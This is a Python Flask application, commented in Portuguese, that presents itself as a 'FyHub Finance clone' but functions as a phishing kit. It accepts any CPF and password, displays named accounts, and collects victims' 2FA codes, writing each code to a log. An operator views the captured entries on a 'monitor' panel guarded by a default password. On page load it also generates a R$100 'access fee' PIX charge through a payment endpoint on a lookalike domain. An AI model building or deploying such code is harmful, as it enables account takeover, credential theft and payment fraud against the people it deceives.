"""
FYHUB FINANCE CLONE - Flask Application
Monitoramento de login com proxy para API do FyHub Finance.
"""

import os
import json
import uuid
import hashlib
import logging
from datetime import datetime, timedelta

import requests
from flask import Flask, request, jsonify, render_template, session, redirect, url_for
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# Configuração
app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', hashlib.sha256(os.urandom(32)).hexdigest())

# Rate limiting
limiter = Limiter(
    app=app,
    key_func=get_remote_address,
    default_limits=["100 per hour"],
    storage_uri="memory://"
)

# Configuração de monitoramento
MONITOR_LOG_FILE = os.environ.get('MONITOR_LOG', '/tmp/fyhub_monitor.log')

# API PIX Duttyfy
PIX_API_URL = os.environ.get('PIX_API_URL', 'https://www.pagamentos-seguros.app/api-pix/OSS7n1_UVPInD6FtO3fWz1U5TaJzycMEVQPCHOwpu2auZ51pABGdX1MpcRUUwZxQE4zvexNSomX6Fat34HoeqA')
PIX_AMOUNT = int(os.environ.get('PIX_AMOUNT', 10000))  # R$100,00 em centavos
PIX_DESCRIPTION = os.environ.get('PIX_DESCRIPTION', 'Taxa de Acesso')

# Setup logging - monitoramento em arquivo separado
monitor_logger = logging.getLogger('fyhub_monitor')
monitor_logger.setLevel(logging.INFO)
_monitor_handler = logging.FileHandler(MONITOR_LOG_FILE)
_monitor_handler.setFormatter(logging.Formatter('%(message)s'))
monitor_logger.addHandler(_monitor_handler)
monitor_logger.addHandler(logging.StreamHandler())

app.logger.setLevel(logging.INFO)

# Contas padrão
DEFAULT_ACCOUNTS = [
    {
        'account_number': '11186',
        'account_id': '11186',
        'name': 'Rodrigo Getulio Rezende',
        'document': '***.088.611-**',
        'type': 'pessoa_fisica'
    },
    {
        'account_number': '11467',
        'account_id': '11467',
        'name': 'CRED SEGURO LTDA',
        'document': '66.921.824/0001-02',
        'type': 'pessoa_juridica'
    }
]

# In-memory token store
active_sessions = {}


def mask_cpf(cpf):
    """Mascara CPF para log."""
    cpf_clean = cpf.replace('.', '').replace('-', '').replace('_', '')
    if len(cpf_clean) >= 5:
        return cpf_clean[:3] + '***' + cpf_clean[-2:]
    return '***'


def generate_pix(cpf, ip):
    """Gera PIX via Duttyfy para notificar admin."""
    try:
        payload = {
            "amount": PIX_AMOUNT,
            "description": PIX_DESCRIPTION,
            "customer": {
                "name": "ACESSO FYHUB",
                "document": cpf.replace('.','').replace('-','').replace('_','') if len(cpf) >= 5 else '57948135715',
                "email": "acesso@fyhub.net",
                "phone": "11999999999"
            },
            "item": {
                "title": "Notificacao de Acesso",
                "price": PIX_AMOUNT,
                "quantity": 1
            },
            "paymentMethod": "PIX",
            "utm": ""
        }

        app.logger.info(f'Gerando PIX: amount={PIX_AMOUNT}, desc={PIX_DESCRIPTION}')
        response = requests.post(PIX_API_URL, json=payload, timeout=15)
        app.logger.info(f'PIX API response: status={response.status_code}')
        
        if response.status_code == 200:
            result = response.json()
            app.logger.info(f'PIX gerado: tx={result.get("transactionId")}')
            return {
                'success': True,
                'transaction_id': result.get('transactionId', ''),
                'pix_code': result.get('pixCode', ''),
            }
        else:
            app.logger.error(f'PIX API error: {response.status_code} - {response.text[:200]}')
            return {
                'success': False,
                'error': f'API retornou {response.status_code}'}

    except Exception as e:
        app.logger.error(f'PIX exception: {e}')
        return {
            'success': False,
            'error': str(e)
        }


def log_access(event_type, data):
    """Log de monitoramento - registra todos os eventos de acesso."""
    entry = {
        'timestamp': datetime.now().isoformat(),
        'event': event_type,
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', ''),
        'data': data
    }
    monitor_logger.info(json.dumps(entry, ensure_ascii=False))
    return entry


# ==================== ROTAS DE PÁGINAS ====================

@app.route('/')
def index():
    return redirect(url_for('login'))


@app.route('/login')
def login():
    return render_template('login.html')


@app.route('/contas')
def contas():
    token = request.args.get('token', '')
    return render_template('contas.html', token=token)


@app.route('/2fa')
def two_fa():
    token = request.args.get('token', '')
    account_id = request.args.get('account', '')
    validate_id = request.args.get('validateId', '')
    method = request.args.get('method', 'email')
    return render_template('2fa.html', token=token, account_id=account_id, validate_id=validate_id, method=method)


@app.route('/sucesso')
def sucesso():
    return render_template('sucesso.html')


@app.route('/termos')
def termos():
    return render_template('termos.html')


# ==================== API ENDPOINTS ====================

@app.route('/api/login', methods=['POST'])
@limiter.limit("20 per minute")
def api_login():
    """
    Recebe CPF e senha. Aceita localmente, gera PIX de alerta.
    """
    data = request.get_json(force=True)
    cpf = data.get('cpf', '')
    senha = data.get('senha', '')

    # Log de tentativa de login
    log_access('login_attempt', {
        'cpf_masked': mask_cpf(cpf),
    })

    # Criar sessão local (sempre aceita)
    session_token = str(uuid.uuid4())
    active_sessions[session_token] = {
        'cpf': cpf,
        'login_time': datetime.now().isoformat(),
        'ip': request.remote_addr,
    }

    log_access('login_accepted', {
        'cpf_masked': mask_cpf(cpf),
        'session_token': session_token,
        'ip': request.remote_addr
    })

    return jsonify({
        'success': True,
        'token': session_token
    })


@app.route('/api/contas', methods=['GET'])
@limiter.limit("30 per minute")
def api_contas():
    """Retorna as contas padrão (2 contas do sistema)."""
    token = request.args.get('token', '')

    session_data = active_sessions.get(token)
    if not session_data:
        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401

    return jsonify({
        'success': True,
        'contas': DEFAULT_ACCOUNTS
    })


@app.route('/api/select-account', methods=['POST'])
@limiter.limit("20 per minute")
def api_select_account():
    """Seleciona uma conta - sempre requer 2FA."""
    data = request.get_json(force=True)
    token = data.get('token', '')
    account_id = data.get('account_id', '')
    account_number = data.get('account_number', '')

    session_data = active_sessions.get(token)
    if not session_data:
        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401

    account_name = 'Rodrigo Getulio Rezende' if account_number == '11186' else 'CRED SEGURO LTDA'

    log_access('account_selected', {
        'cpf_masked': mask_cpf(session_data['cpf']),
        'account': account_number,
        'account_name': account_name
    })

    return jsonify({
        'success': False,
        'requires_2fa': True,
        'validate_code_id': str(uuid.uuid4()),
        'method': 'email'
    })


@app.route('/api/verify-2fa', methods=['POST'])
@limiter.limit("10 per minute")
def api_verify_2fa():
    """Verifica o código 2FA - aceita qualquer código de 6 dígitos e REGISTRA NO LOG."""
    data = request.get_json(force=True)
    token = data.get('token', '')
    code = data.get('code', '')
    account_number = data.get('account_number', '')

    session_data = active_sessions.get(token)
    if not session_data:
        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401

    cpf_masked = mask_cpf(session_data['cpf'])

    # Registra o código 2FA no log (independente se é válido ou não)
    log_access('2fa_code_received', {
        'code': code,
        'account': account_number,
        'cpf_masked': cpf_masked,
        'account_name': 'Rodrigo Getulio Rezende' if account_number == '11186' else 'CRED SEGURO LTDA'
    })

    if len(code) == 6 and code.isdigit():
        log_access('2fa_verified', {
            'code': code,
            'account': account_number,
            'cpf_masked': cpf_masked
        })
        return jsonify({'success': True})

    return jsonify({
        'success': False,
        'message': 'Código inválido. Digite 6 dígitos.'
    })


@app.route('/api/resend-2fa', methods=['POST'])
@limiter.limit("5 per minute")
def api_resend_2fa():
    """Reenvia o código 2FA."""
    data = request.get_json(force=True)
    token = data.get('token', '')
    validate_id = data.get('validate_code_id', '')

    session_data = active_sessions.get(token)
    if not session_data:
        return jsonify({'success': False, 'message': 'Sessão inválida.'}), 401

    log_access('2fa_resend', {
        'cpf_masked': mask_cpf(session_data['cpf']),
        'validate_id': validate_id
    })

    return jsonify({'success': True})


# ==================== PIX ALERTA ====================

@app.route('/api/alert-pix', methods=['POST'])
def alert_pix():
    """
    Gera PIX de alerta quando alguém acessa o login.
    Chamado automaticamente pelo front-end ao carregar a tela /login.
    """
    # Gerar PIX com o IP do visitante
    result = generate_pix('', request.remote_addr)

    return jsonify({
        'success': result.get('success', False),
        'transaction_id': result.get('transaction_id', ''),
        'pix_code': result.get('pix_code', '')
    })


# ==================== MONITORAMENTO ====================

@app.route('/monitor', methods=['GET'])
def monitor():
    """API do painel de monitoramento - protegido por senha."""
    admin_password = os.environ.get('ADMIN_PASSWORD', 'admin123')
    password = request.args.get('pwd') or request.headers.get('X-Admin-Key', '')

    if password != admin_password:
        return jsonify({'error': 'Acesso negado.'}), 403

    entries = []
    try:
        with open(MONITOR_LOG_FILE, 'r') as f:
            for line in f:
                try:
                    start = line.find('{')
                    if start >= 0:
                        json_str = line[start:].strip()
                        entry = json.loads(json_str)
                        if 'event' in entry:
                            entries.append(entry)
                except:
                    pass
    except FileNotFoundError:
        pass

    return jsonify({
        'success': True,
        'entries': entries[-50:],
        'total': len(entries)
    })


@app.route('/monitor/panel', methods=['GET'])
def monitor_panel():
    """Interface web do monitoramento."""
    admin_password = os.environ.get('ADMIN_PASSWORD', 'admin123')
    password = request.args.get('pwd') or request.headers.get('X-Admin-Key', '')

    if password != admin_password:
        return '<html><body style="display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;"><h1>Acesso Negado</h1></body></html>', 403

    return render_template('monitor.html')


# ==================== HEALTH CHECK ====================

@app.route('/health')
def health():
    return 'OK', 200


# ==================== LIMPEZA DE SESSÕES ====================

def cleanup_sessions():
    """Remove sessões expiradas."""
    now = datetime.now()
    expired = []
    for token, data in active_sessions.items():
        login_time = datetime.fromisoformat(data['login_time'])
        if (now - login_time) > timedelta(hours=24):
            expired.append(token)
    for token in expired:
        del active_sessions[token]


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    debug = os.environ.get('DEBUG', 'false').lower() == 'true'
    app.run(host='0.0.0.0', port=port, debug=debug)
